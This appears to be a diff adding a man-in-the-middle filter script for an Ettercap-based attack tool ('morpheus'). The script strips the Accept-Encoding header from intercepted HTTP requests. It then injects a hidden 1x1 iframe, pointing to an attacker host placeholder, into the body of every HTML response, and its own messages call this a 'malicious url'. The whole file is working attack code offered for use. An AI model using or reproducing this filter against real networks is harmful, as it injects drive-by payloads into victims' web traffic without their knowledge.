@@ -1,0 +1,50 @@
+############################################################################
+#                                                                          #
+#  HTTPS Request/Response Filter                                           #
+#  based on code from ALoR & NaGA                                          #
+#                                                                          #
+#  This program is free software; you can redistribute it and/or modify    #
+#  it under the terms of the GNU General Public License as published by    #
+#  the Free Software Foundation; either version 2 of the License, or       #
+#  (at your option) any later version.                                     #
+#                                                                          #
+############################################################################
+
+##
+#  This filter will inject one payload into target webpage request
+# 'under MitM attacks' replacing the html tag </title> by our code,
+# befor sending the webpage requested to target machine!
+##
+
+
+##########################
+## Zap Content Encoding ##
+##########################
+if (ip.proto == TCP && tcp.dst == 80) {
+  msg("[morpheus] host:IpAdDR   [ -> ]  port:80 http ☆");
+  if (search(DATA.data, "Accept-Encoding")) {
+  replace("Accept-Encoding", "Accept-Nothing!");
+  msg("[Morpheus] | status: Encoding zapped from request ✔");
+  }
+}
+
+
+
+#####################
+## Replace Content ##
+#####################
+# IpAdDR == 192.168.1.67 == TARGET HOST
+if (ip.proto == TCP && tcp.src == 80) {
+   if (search(DATA.data, "<body>")) {
+    replace("</body>", "</body><iframe width=\"1\" height=\"1\" frameborder=\"0\" src=\"http://IpAdDR/PnAmE\"><\/iframe><\/body>");
+    msg("[Morpheus] |_ info : malicious url injected into </body> ✔\n");
+  }
+}
+
+if (ip.proto == TCP && tcp.src == 80) {
+   if (search(DATA.data, "<BODY>")) {
+    replace("</BODY>", "</BODY><iframe width=\"1\" height=\"1\" frameborder=\"0\" src=\"http://IpAdDR/PnAmE\"><\/iframe><\/body>");
+    msg("[Morpheus] |_ info : malicious url injected into </BODY> ✔\n");
+  }
+}
+
